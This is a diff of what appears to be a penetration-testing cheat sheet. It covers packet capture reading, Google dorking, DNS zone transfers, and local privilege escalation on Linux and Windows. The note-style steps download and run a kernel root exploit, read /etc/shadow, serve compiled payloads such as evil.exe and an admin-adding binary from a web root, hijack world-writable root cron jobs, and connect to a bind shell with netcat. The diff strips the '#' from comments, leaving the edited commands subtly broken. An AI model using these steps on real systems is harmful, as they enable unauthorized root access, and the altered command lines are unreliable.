@@ -46,29 +46,29 @@ Right click on any packet > Follow TCP Stream. You should be able to see clear t
 
 # tcpdump
 
-tcpdump -r <capture.pcap>                              # Read the file
-tcpdump -n src host 192.168.2.10 -r <capture.pcap>     # Specify a source
-tcpdump -n dst host 192.168.2.12 -r <capture.pcap>     # Specify a destination
-tcpdump -n port 443 -r <capture.pcap>                  # Specify a port
-tcpdump -nX -r <capture.pcap>                          # Read the file and dump in hex format
+tcpdump -r <capture.pcap>                              Read the file
+tcpdump -n src host 192.168.2.10 -r <capture.pcap>     Specify a source
+tcpdump -n dst host 192.168.2.12 -r <capture.pcap>     Specify a destination
+tcpdump -n port 443 -r <capture.pcap>                  Specify a port
+tcpdump -nX -r <capture.pcap>                          Read the file and dump in hex format
 ------------------------------------------------------------------------------------------------------
 
 # Google Hacking
 
-site:target.com                                        # Approximate web presence of an organization
-site:target.com -site:www.target.com                   # Locate Subdomains
-filetype:pdf					       # Locate all pdf files
+site:target.com                                        Approximate web presence of an organization
+site:target.com -site:www.target.com                   Locate Subdomains
+filetype:pdf					       Locate all pdf files
 intitle:
 inurl:
 ------------------------------------------------------------------------------------------------------
 
 # DNS
 
-host -t <type> target.com				# Enumeration
-	mx = mail server
-	ns = name server
+host -t <type> target.com				Enumeration
+     mx = mail server
+     ns = name server
 
-host -l target.com <DNS server>				# Zone transfer
+host -l target.com <DNS server>				Zone transfer
 
 
 # debug.exe
@@ -82,15 +82,15 @@ wine exe2bat.exe nc.exe nc.txt
 # Local Privilege Escalation - Linux
 
 ssh user@<target IP>
-id                                                     # Show user/group permissions
-cat /etc/shadow                                        # Access denied
-/etc/issue                                             # OS info
-uname -a                                               # Kernel info
+id                                                     Show user/group permissions
+cat /etc/shadow                                        Access denied
+/etc/issue                                             OS info
+uname -a                                               Kernel info
 
 wget -O exploit.c http://www.exploit-db.com/download/18411
-gcc -o exploit exploit.c                               # Compile exploit
-./exploit                                              # Run exploit
-id                                                     # Show user/group permissions
+gcc -o exploit exploit.c                               Compile exploit
+./exploit                                              Run exploit
+id                                                     Show user/group permissions
 cat /etc/shadow
 
 Option 2 - using Kali
@@ -98,10 +98,10 @@ searchsploit linux local root
 Mempodipper - Linux Local Root => 2.6.39 (32-bit & 64-bit)                /linux/local/18411.c
 cp /usr/share/exploitdb/platforms/linux/local/18411.c /tmp/
 cd /tmp/
-gcc -o exploit 18411.c                                 # Compile exploit
-service apache2 start                                  # Start apache
-netstat -antp | grep apache                            # Verify the service is running
-cp /tmp/exploit /var/www/                              # Copy the exploit to the web root
+gcc -o exploit 18411.c                                 Compile exploit
+service apache2 start                                  Start apache
+netstat -antp | grep apache                            Verify the service is running
+cp /tmp/exploit /var/www/                              Copy the exploit to the web root
 ------------------------------------------------------------------------------------------------------
 
 # Local Privilege Escaltion - Windows XP, 2003
@@ -111,9 +111,9 @@ cp /usr/share/exploitdb/platforms/windows/local/18176.py /tmp/
 cd /usr/share/pyinstaller/ 
 pyinstaller -F -n evil.exe /tmp/18176.py
 cp evil.exe/dist/evil.exe /tmp/
-service apache2 start                                  # Start apache
-netstat -antp | grep apache                            # Verify the service is running
-cp /tmp/evil.exe /var/www/                             # Copy the exploit to the web root
+service apache2 start                                  Start apache
+netstat -antp | grep apache                            Verify the service is running
+cp /tmp/evil.exe /var/www/                             Copy the exploit to the web root
 ------------------------------------------------------------------------------------------------------
 
 # Weak Services - Windows
@@ -124,7 +124,7 @@ services.msc
 Find the service > RC > Properties
 Note the path to executable
 cd to that directory
-icacls vulnapp.exe                                     # Misconfigured if the Everyone group has access
+icacls vulnapp.exe                                     Misconfigured if the Everyone group has access
 
 Kali
 cat adduser.c
@@ -136,7 +136,7 @@ int main ()
    return 0;
 }
 
-i586-mingw32msvc-gcc adduser.c -o adduser.exe          # Cross compile code
+i586-mingw32msvc-gcc adduser.c -o adduser.exe          Cross compile code
 file adduser.exe
 mv adduser.exe /var/www/
 
@@ -153,7 +153,7 @@ The account with Users privs should how have Admin privs
 
 # Weak Services - Linux
 
-find / -perm -2 ! -type l -ls 2>/dev/null              # Search for WORLD writable files. 
+find / -perm -2 ! -type l -ls 2>/dev/null              Search for WORLD writable files. 
 
 Look for any cron jobs that are WORLD writable running at root.
 nano /etc/cron.hourly/test.sh
@@ -175,7 +175,7 @@ service apache2 start
 
 Windows
 Open IE to <kali-ip>/exploit.html
-netstat -an:find “4444”                                # Look for a bind shell
+netstat -an:find “4444”                                Look for a bind shell
 
 Kali
 nc -v <target-IP> 4444
